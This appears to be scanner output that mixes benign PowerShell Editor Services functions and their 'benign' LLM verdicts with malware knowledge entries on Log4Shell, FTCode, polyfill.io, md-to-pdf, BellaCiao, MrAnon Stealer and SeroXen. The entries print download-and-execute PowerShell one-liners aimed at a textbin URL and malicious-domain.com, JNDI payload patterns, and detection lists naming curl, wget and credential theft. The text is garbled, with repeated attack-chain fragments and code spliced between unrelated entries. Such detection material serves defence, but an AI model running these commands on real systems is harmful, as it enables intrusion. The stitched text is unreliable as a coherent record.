function Show-VSCodeHtmlContentView {
    <#
    .SYNOPSIS
    Shows an HtmlContentView.

    .DESCRIPTION
    Shows an HtmlContentView that has been created and not shown
    yet or has previously been closed.

    .PARAMETER HtmlContentView
    The HtmlContentView that will be shown.

    .PARAMETER ViewColumn
    If specified, causes the new view to be displayed in the specified column.

    .EXAMPLE
    # Shows the view in the first editor column
    Show-VSCodeHtmlContentView -HtmlContentView $htmlContentView

    .EXAMPLE
    # Shows the view in the third editor column
    Show-VSCodeHtmlContentView -View $htmlContentView -Column Three
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [Alias("View")]
        [ValidateNotNull()]
        [Microsoft.PowerShell.EditorServices.VSCode.CustomViews.IHtmlContentView]
        $HtmlContentView,

        [Parameter(Mandatory = $false)]
        [Alias("Column")]
        [ValidateNotNull()]
        [Microsoft.PowerShell.EditorServices.VSCode.CustomViews.ViewColumn]
        $ViewColumn = [Microsoft.PowerShell.EditorServices.VSCode.CustomViews.ViewColumn]::One
    )

    process {
        $HtmlContentView.Show($ViewColumn).Wait()
    }
}

slice_results.behavior_summary: When executed (shell script), the code defines a PowerShell function that takes an HtmlContentView object and an optional view column parameter, then calls the Show method on the HtmlContentView with the specified column and waits for it to complete, resulting in displaying the HTML content view within the specified editor column in VSCode.
slice_results.explanation: [LLM Judgment: Benign] The provided code defines a PowerShell function intended to display an HTML content view within VSCode. It uses strongly typed parameters and calls a Show method on a passed object, which is consistent with legitimate extension or editor scripting behavior. There is no evidence of remote code execution, obfuscation, downloading or executing external scripts, or any suspicious API usage. The known malicious patterns all involve downloading and executing remote code, obfuscation, or executing arbitrary code from untrusted sources, none of which are present here. The presence of a valid Microsoft signature block further supports the legitimacy of the code.

matched_knowledge.source_package: log4j-core (Maven (Java ecosystem))

matched_snippet.code_snippet: powershell -c iex ((New-Object System.Net.WebClient).DownloadString('https://textbin[.]net/raw/0l8h4xuvxe'))
matched_snippet.code_behavior: At runtime, after remote code execution is achieved, the code uses PowerShell to download and execute a remote script from an attacker-controlled URL, resulting in the execution of arbitrary attacker code on the system.

malice_analysis.why_suspicious: This is a common technique for in-memory malware delivery and execution, often used to bypass disk-based detection and persist malicious activity.
malice_analysis.violated_expectations: Production systems should not execute remote PowerShell scripts from untrusted sources, especially as a result of log message processing.
malice_analysis.similar_legitimate_use: PowerShell remoting and automation may use similar patterns, but only with trusted, internal scripts and never triggered by log data.
key_indicators: PowerShell invocation with iex and DownloadString to external URLs
Remote script execution from untrusted or unknown domains

execution_context.file_location: Shell command executed by attacker-supplied Java class

package_info.package_versions: 2.0-beta9 to 2.14.1 (inclusive)
package_info.why_malicious: These versions of Log4j contain a critical remote code execution vulnerability (CVE-2021-44228, Log4Shell) that allows attackers to inject specially crafted JNDI lookup strings into log messages. This results in arbitrary code execution or sensitive data exfiltration, as Log4j's JNDI feature can be abused to load and execute remote code, enabling attackers to take full control of affected systems.

attack_chain.action: Attacker sends a specially crafted JNDI lookup string in user-controlled input (e.g., HTTP header, form field) to the vulnerable application.
attack_chain.leads_to: Log4j logs the input, triggering a JNDI lookup.

attack_chain.action: Log4j interprets the JNDI lookup string and initiates a connection to an attacker-controlled LDAP server.
attack_chain.leads_to: Application receives a response from the attacker's LDAP server.

attack_chain.action: Attacker's LDAP server responds with a reference to a remote Java class file, which the application downloads and executes.
attack_chain.leads_to: Remote code execution on the application server.

attack_chain.action: Attacker executes post-exploitation payloads to download and run malware, exfiltrate credentials, and establish persistence.
attack_chain.leads_to: System compromise, data theft, and persistence.

attack_chain.action: Attacker may use obfuscated payloads to evade detection and continue exploitation.
attack_chain.leads_to: Continued exploitation and evasion of security controls.

behavioral_signatures: JNDI lookup patterns in log messages (e.g., ${jndi:ldap://...})
Obfuscated JNDI payloads in log messages (e.g., ${jn${lower:d}i:l${lower:d}ap://...})
Unexpected outbound LDAP or DNS connections from application servers during log processing
Java processes spawning shell commands or system utilities (e.g., curl, wget, powershell)
Runtime installation of network utilities (curl, wget) or package managers (apt, yum, apk)
Crontab or systemd service modifications at runtime
Exfiltration of environment variables or credential files via network requests
file_indicators: Crontab entries referencing unknown or suspicious scripts
New or modified systemd service files created post-compromise
Downloaded binaries with short, generic names in /tmp, /var/tmp, or /dev/shm
network_indicators: Outbound LDAP connections to untrusted IPs or domains
DNS requests containing environment variable values (e.g., AWS keys) in subdomains
HTTP POST requests to attacker-controlled domains (e.g., interactsh.com, webhook.site) with credential data
Outbound connections to download remote Java class files (*.class) from untrusted sources
detection_knowledge.how_to_detect: Monitor application logs for JNDI lookup patterns, including obfuscated variants. Detect unexpected outbound LDAP, DNS, or HTTP connections from application servers, especially those containing sensitive data or environment variable values. Alert on Java processes spawning shells, installing packages, or modifying crontabs/systemd services. Watch for access to sensitive files (e.g., ~/.aws/credentials) and exfiltration attempts. Use network monitoring to identify suspicious egress traffic, and correlate with log and process activity for comprehensive detection.

matched_knowledge.source_package: FTCode (N/A (malicious macro and PowerShell payload))

matched_snippet.code_snippet: powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/ftcode.ps1')"
matched_snippet.code_behavior: At PowerShell process start, the command downloads a remote script from an external domain using Net.WebClient.DownloadString, then immediately executes the downloaded code via Invoke-Expression (IEX), resulting in the FTCode ransomware payload running and encrypting user files.

malice_analysis.why_suspicious: The PowerShell command downloads and executes code from an external, untrusted domain in memory, using IEX to avoid writing the script to disk. This is a classic malware delivery pattern that evades traditional file-based detection and enables rapid payload deployment.
malice_analysis.violated_expectations: Legitimate PowerShell usage should not fetch and execute code from untrusted or external sources, especially without user interaction or visibility. System administrators may automate trusted scripts, but not from arbitrary internet locations.
malice_analysis.similar_legitimate_use: IT administrators may use similar PowerShell commands for internal automation, but only with trusted, internal resources and explicit user consent. Downloading and executing code from unknown domains is never standard practice.
key_indicators: Use of Net.WebClient.DownloadString to fetch remote script
Invoke-Expression (IEX) to execute downloaded code in memory
External domain in PowerShell command (e.g., malicious-domain.com/ftcode.ps1)
PowerShell flags: -ExecutionPolicy Bypass, -NoProfile, -WindowStyle Hidden

execution_context.trigger: Immediately after macro execution (PowerShell process start)
execution_context.file_location: PowerShell command executed by macro (child process of Word)

package_info.package_versions: N/A
package_info.why_malicious: FTCode is a ransomware campaign distributed via malicious Microsoft Word documents containing embedded macros. When a victim opens the document and enables macros, the macro executes a PowerShell command that downloads and runs the FTCode ransomware payload. This payload encrypts user files and demands payment for decryption, leveraging a delivery chain specifically designed to compromise the victim's system and extort money.

attack_chain.leads_to: Macro executes a hidden PowerShell command.

attack_chain.action: The macro launches PowerShell with execution policy bypassed and window hidden, initiating a command to download and execute a remote script.
attack_chain.leads_to: PowerShell process downloads and executes the ransomware payload.

attack_chain.action: PowerShell downloads the FTCode ransomware script from a remote server and executes it in memory.
attack_chain.leads_to: Ransomware encrypts user files and displays a ransom demand.

matched_knowledge.source_package: polyfill.io (malicious version) (cdn (JavaScript library))

matched_snippet.code_behavior: At runtime, the code overwrites the website's DOM using document.body.innerHTML or document.write, replacing visible page content with a defacement message, resulting in immediate site defacement for all visitors.

malice_analysis.why_suspicious: Polyfill libraries are only expected to provide compatibility shims and should never modify visible page content or inject defacement messages. The presence of code that overwrites the DOM with a defacement message is a clear indicator of a supply chain compromise.
malice_analysis.violated_expectations: Legitimate polyfill libraries do not alter the main page content or perform any DOM manipulation unrelated to feature shimming. The malicious code performs unauthorized, user-visible DOM overwrites.
malice_analysis.similar_legitimate_use: Legitimate site banners or notifications may update the DOM, but this is always done by site-owned scripts, not by third-party polyfill libraries, and never to display defacement or attack messages.
key_indicators: Use of document.body.innerHTML or document.write to overwrite main content
Defacement message injected from a third-party library (polyfill.io)
Unexpected DOM modification by a polyfill or utility script
Script loaded from polyfill.io CDN performing actions outside of feature shimming

execution_context.trigger: At runtime, when a user visits a site loading the compromised polyfill.io script
execution_context.file_location: polyfill.io JavaScript library loaded via <script src="https://cdn.polyfill.io/v3/polyfill.min.js"></script> or similar CDN URL

package_info.package_versions: unknown (malicious version served via CDN)
package_info.why_malicious: A compromised version of the polyfill.io JavaScript library was served via CDN and injected malicious code into the Internet Archive website. This resulted in unauthorized modification of site content (defacement) visible to all visitors, and potentially enabled further browser-based attacks such as credential theft or data exfiltration. The attack violated the trust model of third-party libraries by executing malicious code in users' browsers.

attack_chain.action: The compromised polyfill.io JavaScript is served via the CDN and loaded by the Internet Archive website through a <script> tag.
attack_chain.leads_to: Malicious JavaScript is executed in the browser of every site visitor.

attack_chain.action: The malicious code executes in the user's browser, overwriting the DOM to display a defacement message.
attack_chain.leads_to: Site defacement is visible to all visitors; this also enables the attacker to potentially launch further browser-based attacks such as credential theft or data exfiltration if additional payloads are present.

behavioral_signatures: Unexpected DOM manipulation (e.g., document.body.innerHTML or document.write) by third-party JavaScript libraries
Defacement messages or unauthorized content injected into page at runtime
Polyfill or utility libraries performing actions outside their intended scope, such as modifying visible page content
file_indicators: polyfill.min.js or similar polyfill.io scripts loaded from untrusted or compromised CDN URLs
Inline or external scripts modifying document.body.innerHTML or document.write with defacement or attack messages
network_indicators: Requests to polyfill.io CDN endpoints known to be compromised
Unusual script loads from third-party domains not previously used by the site, especially polyfill.io
detection_knowledge.how_to_detect: Monitor for unexpected DOM changes initiated by third-party scripts, especially those loaded from polyfill.io or similar CDNs. Alert on any script that overwrites the main content of the page or injects defacement messages. Track and compare the content of externally loaded JavaScript libraries against known-good hashes. Block or alert on polyfill.io CDN usage if the domain is known to be compromised. Implement runtime monitoring to detect unauthorized DOM overwrites by scripts not owned by the site.

matched_knowledge.source_package: jquery (npm)

matched_snippet.code_snippet:
/* Example of a known jQuery XSS vulnerability pattern */
$("#output").html(userInput);
matched_snippet.code_behavior: At runtime, the code takes untrusted user input and injects it directly into the DOM using .html(), resulting in the execution of arbitrary scripts if the input contains malicious payloads, which can lead to cross-site scripting (XSS) attacks.

malice_analysis.why_suspicious: Directly inserting unsanitized user input into the DOM using .html() enables attackers to inject and execute arbitrary JavaScript code, a well-known XSS attack vector.
malice_analysis.violated_expectations: Secure libraries and applications should enforce or encourage safe handling of user input, ensuring that untrusted data is sanitized before being inserted into the DOM. Normal use of jQuery should not expose XSS vulnerabilities by default.
malice_analysis.similar_legitimate_use: This pattern is legitimate only when the input is fully sanitized or originates from a trusted source. However, using .html() with untrusted input is dangerous and should be avoided.
key_indicators: Use of .html() with variables that may contain user input
Absence of input sanitization or encoding before DOM insertion
References to known XSS CVEs affecting jQuery (e.g., CVE-2020-11022, CVE-2020-11023)
Patterns where user-controlled data flows directly into DOM-manipulating functions

package_info.package_versions: Not specified (multiple vulnerable versions referenced in OSS Index database)
package_info.why_malicious: The package itself is not inherently malicious, but several versions are known to contain critical and severe vulnerabilities, particularly cross-site scripting (XSS) flaws, that can be exploited by attackers if used in production environments. These vulnerabilities allow attackers to execute arbitrary scripts in the context of the user's browser, leading to potential data theft, session hijacking, or further compromise.

attack_chain.action: Application uses a vulnerable jQuery version and inserts user input into the DOM using .html() without sanitization.
attack_chain.leads_to: An attacker can inject malicious scripts via user input, resulting in cross-site scripting (XSS) that enables session hijacking, data theft, or further compromise of the user's browser session.

behavioral_signatures: Use of .html() or similar DOM injection methods (e.g., .append(), .prepend()) with variables that may contain unsanitized user input
Presence of known vulnerable jQuery versions in the dependency tree (as identified by CVE references)
Data flow analysis showing user input reaching DOM-manipulating functions without sanitization
file_indicators: jquery.js (vulnerable versions as listed in OSS Index or CVE databases)
package.json referencing outdated or vulnerable jQuery versions
network_indicators: Unusual outbound requests initiated by injected scripts as a result of XSS exploitation (e.g., requests to attacker-controlled domains after DOM injection)
detection_knowledge.how_to_detect: Scan dependency manifests (such as package.json) for known vulnerable jQuery versions using SCA tools (e.g., DepShield, OSS Index). Perform static code analysis to identify instances where .html() or similar DOM-manipulating methods are called with variables that may contain user input and lack sanitization. Monitor runtime for DOM modifications that include user-supplied data without proper encoding or sanitization. Set up network monitoring to detect suspicious outbound requests that may be triggered by XSS payloads.

malice_analysis.why_suspicious: Chaining remote script execution via mshta is a known fileless malware technique that allows attackers to evade disk-based detection.
malice_analysis.violated_expectations: Legitimate HTML applications should not redirect to or execute further remote scripts for code execution, especially using mshta.
malice_analysis.similar_legitimate_use: Web-based installers may chain downloads, but not via mshta in this context or from untrusted domains.

No user interaction required for execution

Flag outbound FTP or custom TCP connections to suspicious or dynamic DNS domains. Alert on AMSI bypass attempts, creation of suspicious registry keys or mutexes, and unauthorized executables in system directories such as %appdata% or ProgramData.

matched_knowledge.source_package: md-to-pdf (npm)

matched_snippet.code_behavior: At runtime, when user-supplied Markdown is processed for PDF export, the code executes arbitrary JavaScript via the gray-matter front matter parser, reads the contents of /flag.txt using Node.js fs.readFileSync, and injects the file contents into the CSS of the generated PDF, resulting in exfiltration of sensitive data to the attacker.

malice_analysis.why_suspicious: This code abuses the Markdown front matter feature to execute arbitrary JavaScript on the server, which is highly abnormal and dangerous. It directly accesses sensitive files using Node.js APIs and exposes their contents to the user through the generated PDF.
malice_analysis.violated_expectations: Normally, Markdown-to-PDF conversion should only process markup and never execute arbitrary code. The expected behavior is safe, deterministic rendering of user input, not server-side code execution or file access.
malice_analysis.similar_legitimate_use: Server-side code execution via Markdown front matter is never legitimate in production environments. In rare, highly controlled admin-only scenarios, such features might be used for advanced templating, but never with untrusted or user-supplied input.
key_indicators: Presence of ---js front matter blocks in Markdown input
Arbitrary JavaScript execution during Markdown parsing
Direct filesystem access via require('fs').readFileSync in user-supplied content
Injection of sensitive file contents into user-facing output (PDF)
Lack of input sanitization or code execution restrictions in Markdown processing

execution_context.trigger: At runtime, when user-supplied Markdown is processed for PDF export

package_info.why_malicious: The md-to-pdf package (version 4.1.0) is critically vulnerable because it uses the gray-matter library with JavaScript engine support enabled by default. This allows attackers to inject arbitrary JavaScript code via Markdown front matter, resulting in remote code execution (RCE) on the server. Exploitation enables attackers to read sensitive files (such as /flag.txt) and exfiltrate their contents, violating core security boundaries.

attack_chain.action: Attacker submits specially crafted Markdown containing a ---js front matter block with malicious JavaScript to the invoice generator.
attack_chain.leads_to: Server parses the Markdown and executes the embedded JavaScript code.

attack_chain.action: The malicious JavaScript reads the contents of /flag.txt using Node.js fs.readFileSync.
attack_chain.leads_to: Sensitive data (flag) is loaded into memory during document generation.

attack_chain.action: The code injects the flag value into the CSS of the generated PDF document.
attack_chain.leads_to: Flag is exfiltrated to the attacker via the exported PDF file.

behavioral_signatures: Execution of arbitrary JavaScript during Markdown-to-PDF conversion
Access to sensitive files (e.g., /flag.txt) from within Markdown processing
User-controlled input leading to server-side code execution during document generation
file_indicators: Markdown files or input containing ---js front matter blocks
References to require('fs') or other Node.js modules in user-supplied Markdown content
network_indicators: Unusual outbound connections initiated during Markdown processing (if exfiltration is attempted via network)
No direct network indicators in this specific exploit, but possible in variants where exfiltration is performed over the network
detection_knowledge.how_to_detect: Monitor for the use of ---js front matter in Markdown inputs, especially when processed by md-to-pdf or gray-matter. Audit application logs for unexpected file access (e.g., /flag.txt) during document generation. Use static analysis to detect unsafe use of gray-matter with JS engine enabled. Block or sanitize user-supplied front matter in Markdown, and upgrade md-to-pdf to a version that disables arbitrary code execution. Implement strict input validation and disable JavaScript execution in Markdown processing libraries.

matched_knowledge.source_package: @jayxuz/vue3-admin-icons (npm)

matched_snippet.code_behavior: At runtime (when the web application loads in the browser), the code checks for the presence and value of the VUE_APP_SECRET_KEY environment variable and verifies if the application is running on a hardcoded list of allowed domains in production; if these checks fail, it sets document.body.innerHTML to an empty string, resulting in the entire web page being erased and the application rendered unusable for end users.

malice_analysis.why_suspicious: The code performs destructive actions by blanking the entire web page if the deployment environment does not meet specific, hardcoded criteria. This is not a standard practice and is indicative of intentional sabotage.
malice_analysis.violated_expectations: Legitimate packages should not contain logic that disables or destroys the application based on deployment environment or domain. Normal frontend code does not erase the UI for users based on environment variables or domain checks.
malice_analysis.similar_legitimate_use: Domain and environment variable checks are sometimes used for licensing enforcement or feature gating, but legitimate implementations do not destroy the user interface or application functionality as a consequence.
key_indicators: Destructive DOM manipulation (document.body.innerHTML = '')
Hardcoded allow-list of domains in frontend code
Conditional logic tied to environment variables (VUE_APP_SECRET_KEY, NODE_ENV)
Sabotage logic triggered only in production environments
Absence of user notification or error handling before destructive action

attack_chain.leads_to: The code determines if the application is running on an unauthorized domain in a production environment.

function Close-VSCodeHtmlContentView {
    <#
    .SYNOPSIS
    Closes an HtmlContentView.

    .DESCRIPTION
    Closes an HtmlContentView inside of Visual Studio Code if
    it is displayed.

    .PARAMETER HtmlContentView
    The HtmlContentView to be closed.

    .EXAMPLE
    Close-VSCodeHtmlContentView -HtmlContentView $htmlContentView
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [Alias("View")]
        [ValidateNotNull()]
        [Microsoft.PowerShell.EditorServices.VSCode.CustomViews.IHtmlContentView]
        $HtmlContentView
    )

    process {
        $HtmlContentView.Close().Wait();
    }
}

#

function New-VSCodeHtmlContentView {
    <#
    .SYNOPSIS
    Creates a custom view in Visual Studio Code which displays HTML content.

    .DESCRIPTION
    Creates a custom view in Visual Studio Code which displays HTML content.

    .PARAMETER Title
    The title of the view.

    .PARAMETER ShowInColumn
    If specified, causes the new view to be displayed in the specified column.
    If unspecified, the Show-VSCodeHtmlContentView cmdlet will need to be used
    to display the view.

    .EXAMPLE
    # Create a new view called "My Custom View"
    $htmlContentView = New-VSCodeHtmlContentView -Title "My Custom View"

    .EXAMPLE
    # Create a new view and show it in the second view column
    $htmlContentView = New-VSCodeHtmlContentView -Title "My Custom View" -ShowInColumn Two
    #>
    [CmdletBinding()]
    [OutputType([Microsoft.PowerShell.EditorServices.VSCode.CustomViews.IHtmlContentView])]
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Title,

        [Parameter(Mandatory = $false)]
        [Microsoft.PowerShell.EditorServices.VSCode.CustomViews.ViewColumn]
        $ShowInColumn
    )

    process {
        if ($psEditor -is [Microsoft.PowerShell.EditorServices.Extensions.EditorObject]) {
            $viewFeature = $psEditor.Components.Get([Microsoft.PowerShell.EditorServices.VSCode.CustomViews.IHtmlContentViews])
            $view = $viewFeature.CreateHtmlContentView($Title).Result

            if ($ShowInColumn) {
                $view.Show($ShowInColumn).Wait();
            }

            return $view
        }
    }
}

attack_chain.leads_to: Application receives a response from the attacker's LDAP server.

attack_chain.action: Attacker's LDAP server responds with a reference to a remote Java class file, which the application downloads and executes.
attack_chain.leads_to: Remote code execution on the application server.

attack_chain.action: Attacker executes post-exploitation payloads to download and run malware, exfiltrate credentials, and establish persistence.
attack_chain.leads_to: System compromise, data theft, and persistence.

attack_chain.action: Attacker may use obfuscated payloads to evade detection and continue exploitation.

This results in arbitrary code execution or sensitive data exfiltration, as Log4j's JNDI feature can be abused to load and execute remote code, enabling attackers to take full control of affected systems.

attack_chain.leads_to: Log4j logs the input, triggering a JNDI lookup.

attack_chain.action: Log4j interprets the JNDI lookup string and initiates a connection to an attacker-controlled LDAP server.
attack_chain.leads_to: Application receives a response from the attacker's LDAP server.

attack_chain.action: Attacker's LDAP server responds with a reference to a remote Java class file, which the application downloads and executes.
attack_chain.leads_to: Remote code execution on the application server.

attack_chain.action: Attacker executes post-exploitation payloads to download and run malware, exfiltrate credentials, and establish persistence.
attack_chain.leads_to: System compromise, data theft, and persistence.

attack_chain.action: Attacker may use obfuscated payloads to evade detection and continue exploitation.
attack_chain.leads_to: Continued exploitation and evasion of security controls.

Unexpected outbound LDAP or DNS connections from application servers during log processing
Java processes spawning shell commands or system utilities (e.g., curl, wget, powershell)
Runtime installation of network utilities (curl, wget) or package managers (apt, yum, apk)
Crontab or systemd service modifications at runtime
Exfiltration of environment variables or credential files via network requests
file_indicators: Crontab entries referencing unknown or suspicious scripts
New or modified systemd service files created post-compromise
Downloaded binaries with short, generic names in /tmp, /var/tmp, or /dev/shm

DNS requests containing environment variable values (e.g., AWS keys) in subdomains

detection_knowledge.how_to_detect: Monitor application logs for JNDI lookup patterns, including obfuscated variants. Detect unexpected outbound LDAP, DNS, or HTTP connections from application servers, especially those containing sensitive data or environment variable values. slice_results.code_snippet:
<#
.SYNOPSIS
    Starts the language and debug services from the PowerShellEditorServices module.
.DESCRIPTION
    PowerShell Editor Services Bootstrapper Script
    ----------------------------------------------
    This script contains startup logic for the PowerShell Editor Services
    module when launched by an editor.  It handles the following tasks:

    - Verifying the existence of dependencies like PowerShellGet
    - Verifying that the expected version of the PowerShellEditorServices module is installed
    - Installing the PowerShellEditorServices module if confirmed by the user
    - Creating named pipes for the language and debug services to use (if using named pipes)
    - Starting the language and debug services from the PowerShellEditorServices module
.INPUTS
    None
.OUTPUTS
    None
.NOTES
    If editor integration authors make modifications to this script, please
    consider contributing changes back to the canonical version of this script
    at the PowerShell Editor Services GitHub repository:
    https://github.com/PowerShell/PowerShellEditorServices/blob/master/module/PowerShellEditorServices/Start-EditorServices.ps1'
#>
[CmdletBinding(DefaultParameterSetName="NamedPipe")]
param(
    [Parameter(Mandatory=$true)]
    [ValidateNotNullOrEmpty()]
    [string]
    $HostName,

    [Parameter(Mandatory=$true)]
    [ValidateNotNullOrEmpty()]
    [string]
    $HostProfileId,

    [Parameter(Mandatory=$true)]
    [ValidateNotNullOrEmpty()]
    [string]
    $HostVersion,

    [ValidateNotNullOrEmpty()]
    [string]
    $BundledModulesPath,

    [ValidateNotNullOrEmpty()]
    $LogPath,

    [ValidateSet("Diagnostic", "Verbose", "Normal", "Warning", "Error")]
    $LogLevel,

	[Parameter(Mandatory=$true)]
	[ValidateNotNullOrEmpty()]
	[string]
	$SessionDetailsPath,

    [switch]
    $EnableConsoleRepl,

    [switch]
    $DebugServiceOnly,

    [string[]]
    $AdditionalModules,

    [string[]]
    $FeatureFlags,

    [switch]
    $WaitForDebugger,

    [switch]
    $ConfirmInstall,

    [Parameter(ParameterSetName="Stdio", Mandatory=$true)]
    [switch]
    $Stdio,

    [Parameter(ParameterSetName="NamedPipe")]
    [string]
slice_results.behavior_summary: When executed (shell script), the code verifies the presence and version of the PowerShellEditorServices module, optionally installs it upon user confirmation, creates named pipes for communication, and starts the language and debug services from the module, facilitating integrated development environment support for PowerShell scripting.
slice_results.explanation: [LLM Judgment: Benign] The provided PowerShell script is a legitimate bootstrapper for the PowerShellEditorServices module, designed to verify dependencies, optionally install the module, create named pipes, and start language and debug services. It does not exhibit any of the suspicious behaviors seen in the known malicious patterns, such as downloading and executing remote payloads, running disguised executables, or communicating with hardcoded C2 domains. The script's purpose is clearly documented and aligns with normal IDE integration tasks. No obfuscation, network communication to suspicious domains, or unauthorized system manipulation is present.

package_info.why_malicious: BellaCiao is a custom dropper malware attributed to the Charming Kitten APT group. It is designed to deliver additional payloads, establish persistence on compromised systems, enable remote command execution, and facilitate data exfiltration. The malware uses hardcoded command-and-control (C2) infrastructure, masquerades as legitimate Microsoft Exchange services, and leverages reverse proxy tools such as Plink for covert C2 communication, making detection and remediation challenging.

attack_chain.action: Initial execution of the BellaCiao dropper on the target system.
attack_chain.leads_to: Payload decoding and execution

attack_chain.action: Decoding and writing of the embedded payload to disk, followed by execution.
attack_chain.leads_to: Establishing persistence and C2 setup

attack_chain.action: Establishing persistence by creating a disguised Windows service.
attack_chain.leads_to: Automatic execution on system startup

attack_chain.action: Launching PowerShell scripts to set up local HTTP servers for command execution.
attack_chain.leads_to: Remote command and control

attack_chain.action: Establishing reverse proxy tunnels to C2 infrastructure using Plink, either directly or via WMIC.
attack_chain.leads_to: Covert C2 communication

attack_chain.action: Ongoing communication with C2 domains for command execution and further payload delivery.
attack_chain.leads_to: Full remote control and post-exploitation

behavioral_signatures: Decoding and execution of embedded, malformed base64 payloads within executables
Creation of Windows services with names mimicking Exchange processes and pointing to non-standard binary locations
PowerShell scripts running local HTTP servers for remote command execution
Execution of Plink or similar tunneling tools for reverse proxying to external IPs or domains
Use of WMIC to launch processes with parameters establishing reverse proxies to C2 infrastructure
detection_knowledge.how_to_detect: Monitor for the creation of new Windows services with names similar to Exchange processes, especially if the associated binaries are located in non-standard directories. Detect PowerShell scripts that implement local HTTP servers or execute binaries with suspicious, Exchange-like names. Look for execution of Plink or similar tunneling tools, particularly when launched via WMIC or with parameters connecting to known C2 domains or IPs. Correlate network traffic to the listed domains and IP addresses, and flag any outbound connections to these indicators. Use YARA or similar rules to identify executables containing malformed base64-encoded payloads. Combine behavioral, file, and network indicators for comprehensive detection and response.

malice_analysis.similar_legitimate_use: Some enterprise deployment tools may use embedded scripts, but these are typically signed, well-documented, and do not execute without user awareness.

package_info.why_malicious: MrAnon Stealer is a multi-stage info-stealer malware distributed via phishing emails. It leverages a combination of .NET, PowerShell, and Python (cx-Freeze packed) payloads to steal credentials, browser sessions, cryptocurrency wallets, and sensitive files. The malware exfiltrates stolen data to public file-sharing sites and the attacker's Telegram channel, using deceptive techniques to evade user suspicion and security controls.

attack_chain.action: User receives phishing email with malicious PDF attachment.
attack_chain.leads_to: User opens PDF and clicks downloader link.

attack_chain.action: Downloader link in PDF fetches .NET executable (adobe.exe) from remote server.
attack_chain.leads_to: User executes downloaded .NET file.

attack_chain.action: .NET executable unpacks and runs PowerShell script (down2.ps1).
attack_chain.leads_to: PowerShell script execution.

attack_chain.action: PowerShell script downloads and extracts zip payload, executes python.exe, and displays fake error message.
attack_chain.leads_to: Malicious python.exe execution.

attack_chain.action: python.exe loads and executes malicious Python code from library.zip.
attack_chain.leads_to: Execution of info-stealer logic.

attack_chain.action: Malicious Python code steals data, exfiltrates to gofile[.]io, and sends notification to attacker's Telegram.
attack_chain.leads_to: Attacker receives stolen data and system info.

behavioral_signatures: PDF attachments with hidden downloader links that initiate executable downloads
Execution of .NET binaries that unpack and run embedded PowerShell scripts
PowerShell scripts that download and execute remote binaries and display fake error dialogs
Presence of cx-Freeze packed Python executables loading .pyc files from library.zip
Process termination of browsers, cryptocurrency wallets, and security tools
Bulk collection and compression of files with sensitive extensions

detection_knowledge.how_to_detect: Monitor for emails with PDF attachments containing hidden downloader links that initiate executable downloads. Detect execution of .NET binaries that unpack and run embedded PowerShell scripts, especially those that download further payloads from suspicious domains. Flag PowerShell scripts that download and execute binaries, display fake error dialogs, or drop non-standard python.exe files. Look for cx-Freeze packed Python executables loading .pyc files from library.zip. Alert on process termination of browsers, wallets, and security tools, as well as bulk file compression and uploads to public file-sharing sites or Telegram bots. Correlate network activity to known malicious domains and Telegram API usage with suspicious bot tokens.

Register-EditorCommand `
    -Name 'PowerShellEditorServices.OpenEditorProfile' `
    -DisplayName 'Open Editor Profile' `
    -SuppressOutput `
    -ScriptBlock {
        param([Microsoft.PowerShell.EditorServices.Extensions.EditorContext]$context)
        If (!(Test-Path -Path $Profile)) { New-Item -Path $Profile -ItemType File }
        $psEditor.Workspace.OpenFile($Profile)
    }

Register-EditorCommand `
    -Name 'PowerShellEditorServices.OpenProfileList' `
    -DisplayName 'Open Profile from List (Current User)' `
    -SuppressOutput `
    -ScriptBlock {
        param([Microsoft.PowerShell.EditorServices.Extensions.EditorContext]$context)
        
        $Current = Split-Path -Path $profile -Leaf        
        $List = @($Current,'Microsoft.VSCode_profile.ps1','Microsoft.PowerShell_profile.ps1','Microsoft.PowerShellISE_profile.ps1','Profile.ps1') | Select-Object -Unique
        $Choices = [System.Management.Automation.Host.ChoiceDescription[]] @($List)
        $Selection = $host.ui.PromptForChoice('Please Select a Profile', '(Current User)', $choices,'0')
        $Name = $List[$Selection]
        
        $ProfileDir = Split-Path $Profile -Parent
        $ProfileName = Join-Path -Path $ProfileDir -ChildPath $Name
        
        If (!(Test-Path -Path $ProfileName)) { New-Item -Path $ProfileName -ItemType File }
        
        $psEditor.Workspace.OpenFile($ProfileName)
    }

slice_results.behavior_summary: When executed (shell script), the code registers two PowerShell editor commands that check for the existence of specific user profile script files (creating them if absent) and open these profile files within the editor workspace, facilitating user access and editing of PowerShell profile scripts without external communication.
slice_results.explanation: [LLM Judgment: Benign] The analyzed code registers two PowerShell editor commands that facilitate opening and creating PowerShell profile scripts within the editor workspace. It performs straightforward file existence checks and file creation if missing, then opens these files for user editing. There is no evidence of obfuscation, decryption, dynamic code loading, network communication, or any form of payload execution. The code's behavior is benign and intended for user convenience in managing PowerShell profiles. Compared to the known malicious patterns, which involve AES decryption, in-memory DLL loading, reverse shells, and obfuscated payload extraction, this code lacks any similar suspicious operations or intent. The presence of a signature block indicates code signing, further supporting legitimacy.

matched_knowledge.source_package: Pathoschild.Stardew.Mod.Build.Config (NuGet)

matched_snippet.code_behavior: At install-time, the PowerShell script decrypts and decompresses two embedded DLLs from the batch file, then loads and executes them in-memory, resulting in the deployment of the SeroXen RAT.

malice_analysis.why_suspicious: The script performs in-memory decryption and execution of DLLs, a hallmark of fileless malware and advanced evasion. It extracts payloads from obfuscated sources and loads them without touching disk.
malice_analysis.violated_expectations: Legitimate install scripts do not decrypt and execute arbitrary DLLs from obfuscated sources in-memory. Such behavior is associated with advanced malware techniques to evade endpoint detection.
malice_analysis.similar_legitimate_use: In-memory execution may be used in advanced legitimate updaters or packers, but not for arbitrary, untrusted payloads sourced from obfuscated scripts.
key_indicators: AES decryption and GZip decompression of embedded payloads
Dynamic assembly loading and invocation in PowerShell
Extraction of payloads from obfuscated batch script
No user interaction or consent
Fileless execution of RAT payloads

execution_context.file_location: Reconstructed and executed in-memory PowerShell script

package_info.why_malicious: The package is a typosquat of a legitimate package and contains malicious install scripts that download, decrypt, and execute the SeroXen RAT, a remote access trojan. The package abuses NuGet's install-time scripting to covertly deploy malware, and all versions are designed to deliver this payload. The attack chain leverages multiple layers of obfuscation and in-memory execution to evade detection and persist on the victim system.

